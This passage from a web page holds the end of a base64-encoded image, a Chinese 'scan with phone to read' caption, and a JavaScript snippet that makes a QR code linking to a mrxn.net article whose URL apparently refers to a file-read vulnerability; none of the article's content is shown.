L6Hc/rFMFPO9tinN3PR0prkC2mOxuJetbkv+18gkwuuel7lwhemjuv90bnSl3GMi4vRORrDZ50Rn+XuGzKe1Dfwt4HQk+WIqz1mwrQ28Qrn+lEz5+h+NM75irnOVf5Vo/uM+ymf5nFqVfkynL7fFF+WIlrDjskFS1+WuHAbSAW3ff0JbD9l1aRGe7Y1eurR0/ErNStN+sw4ajmuQcfsGD3NJV5h1lrlwkXDsd/M03mk9FOYfoX3DfnU0f158T2Qp2f895Pbj73z0nV9ZosmfOIgHt/sEOolxKMuYo5x+BGzhxVGx7EPHbPjlTb8q7jaR3FjfcVlIzf79w2ZT+SL4+2bOvtTw2v+s73TPeqJGG1Vk3xyc1z8iiueXgcVHiw1zxCP27nS0LlD0/eANf+eevRCuSfDI58Ex7j4+4bUKXwj2wayekKuuHn/0Y38ihvzK59+YmhMj8KVvrjKxSp+ZnRfdpz1fJx7tt6zXNai14iWjnH/xfDtm31sNyT7Yp8WRz+aV5CujZZjHL6QYy5PTuViHDV0zBlTM2P6jjhrnsWpo9cctTTHEUdN6sPR2vCFp4FEfOPXnMA9kK8598tVf8tAOF+9ecW6jmW0FrNki/H48ZAdq3ZlW9G7M+ffqcMnez/aj4CO5x4Vz5rEKyz9aKOGXiNcdDSP+5v62zf7+C03JF8T+6TDBelcnopCjly0lZuN1nLE1IzIUUPHY89RX35ytJYdK/+q0XXRp29huBkrF/utA5kXuuPPn8BpIJnUCq/aRzvmw9FPzBxjlH/op/5D4bvgSovte1M0QTqXuPC91cufpS9LAd2PHSs/2kp7GkhEN37NCWwDYZ8kz/2f2Srdc3xC4v9Mv8/UZJ0R6f3QmNyqb3IzrrThok08Ir1muGgLt4EkeePXnsA9kK89/9Pq/wUAAP//gcHb/AAAAAZJREFUAwDkDZ+PbHkmNgAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/easy7-gis-exportGisObj-file-read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 